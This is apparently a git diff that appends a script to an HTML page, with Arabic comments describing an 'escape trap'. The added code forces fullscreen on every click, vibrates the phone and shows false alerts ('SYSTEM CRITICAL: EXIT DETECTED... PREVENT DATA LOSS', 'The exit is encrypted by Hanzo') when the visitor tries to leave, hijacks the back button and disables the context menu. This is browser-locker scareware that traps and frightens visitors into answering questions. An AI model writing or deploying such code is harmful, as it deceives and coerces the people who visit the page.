@@ -166,5 +166,43 @@
     </script>
 </body>
 </html>
+<script>
+    // 1. إخفاء الأزرار تماماً (وضع ملء الشاشة القسري)
+    function forceFullscreen() {
+        let el = document.documentElement;
+        if (el.requestFullscreen) {
+            el.requestFullscreen();
+        } else if (el.webkitRequestFullscreen) {
+            el.webkitRequestFullscreen(); // للهواتف القديمة
+        }
+    }
+
+    // تفعيل الإخفاء عند أي لمسة للشاشة
+    document.addEventListener('click', () => {
+        forceFullscreen();
+    });
+
+    // 2. فخ "الهروب": إذا حاولت تصغير المتصفح أو الخروج
+    document.addEventListener("visibilitychange", function() {
+        if (document.hidden) {
+            // إذا حاولت الضغط على زر التطبيقات الحديثة، سيعمل الاهتزاز
+            if (navigator.vibrate) {
+                navigator.vibrate([500, 200, 500, 200, 1000]); 
+            }
+            alert("⚠️ SYSTEM CRITICAL: EXIT DETECTED. COMPLETE THE QUESTIONS TO PREVENT DATA LOSS.");
+        }
+    });
+
+    // 3. منع الرجوع (الكود القديم المطور)
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        history.go(1);
+        navigator.vibrate(500);
+        alert("The exit is encrypted by Hanzo. You cannot leave now.");
+    };
+
+    // 4. منع القائمة اليمنى واللمس المطول
+    window.oncontextmenu = function() { return false; };
+</script>
 
 
